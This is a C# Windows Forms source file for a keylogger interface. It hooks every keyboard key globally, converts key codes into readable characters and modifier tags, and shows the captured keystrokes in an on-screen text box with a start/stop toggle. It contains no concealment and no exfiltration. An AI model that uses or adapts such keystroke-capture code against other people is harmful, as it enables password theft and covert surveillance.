using System;
using System.Windows.Forms;

namespace NotAKeyloggerInterface
{
    public partial class Form1 : Form
    {
        KeyHandler KeyHook;

        public Form1()
        {
            InitializeComponent();
        }

        ~Form1()
        {
            // Make sure to unhook the logger, already happens in destructor of keyhook, but can never be sure enough...
            KeyHook.unhook();
        }

        private void InitializeHooks(object sender, EventArgs e)
        {
            KeyHook = new KeyHandler();
            KeyHook.KeyUp += new KeyEventHandler(ModifierKeysKeyUp);
            KeyHook.KeyDown += new KeyEventHandler(NormalKeysKeyDown);

            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                KeyHook.HookedKeys.Add(key);
        }

        // This is triggered for "special" keys like ctrl shift. Make sure to trigger these only when key-upping. 
        public void ModifierKeysKeyUp(object sender, KeyEventArgs e)
        {
            string getCharVar = ModifierKeyToHumanReadable(e.KeyValue);
            if (getCharVar != null)
                rtbKeylogger.Text += getCharVar;
        }
        // This is triggered for the rest of the keys (mostly non-modifier keys)
        public void NormalKeysKeyDown(object sender, KeyEventArgs e)
        {
            string getCharVar = KeyDownHandler(e.KeyValue);
            if (getCharVar != null)
                rtbKeylogger.Text += getCharVar;
        }

        // Toggle keylogging hook
        private void ToggleLoggingHook(object sender, EventArgs e)
        {
            //Start the KeyboardHook
            if (btnToggleLogging.Text == "Start logging")
            {
                KeyHook.hook();
                btnToggleLogging.Text = "Stop logging";
            }
            else
            {
                KeyHook.unhook();
                btnToggleLogging.Text = "Start logging";
            }
        }

        // Make sure the modifier keys are human readable
        private string ModifierKeyToHumanReadable(int Value)
        {
            switch (Value)
            {
                case 8:
                    return "[Backspace]";
                case 9:
                    return "[Tab]";
                case 13:
                    return "\n";
                case 160:
                    return "[Shift]";
                case 162:
                    return "[CTRL]";
                case 164:
                    return "[Alt]";
                case 20:
                    if (IsKeyLocked(Keys.CapsLock))
                        return "[Caps Lock ON]";
                    else
                        return "[Caps Lock OFF]";
                case 32:
                    return " ";
                case 46:
                    return "[Delete]";
                case 163:
                    return "[R_Alt]";
                case 165:
                    return "[R_Ctrl]";
                default:
                    return null;
            }
        }

        private string KeyDownHandler(int Value)
        {
            // If between those values, numpad is pressed. When removing 48, it will use the "normal" keyboard numbers
            if (Value > 95 && Value < 106)
                return ((char)(Value - 48)).ToString();
            
            // Normal alphabet
            if (Value > 64 && Value < 91)
            {
                if (!IsKeyLocked(Keys.CapsLock))
                    return ((char)(Value + 32)).ToString();
                else
                    return ((char)(Value)).ToString();
            }
            // D keys
            if (Value > 47 && Value < 58)
                return ((char)Value).ToString();

            return null;
        }
    }
}
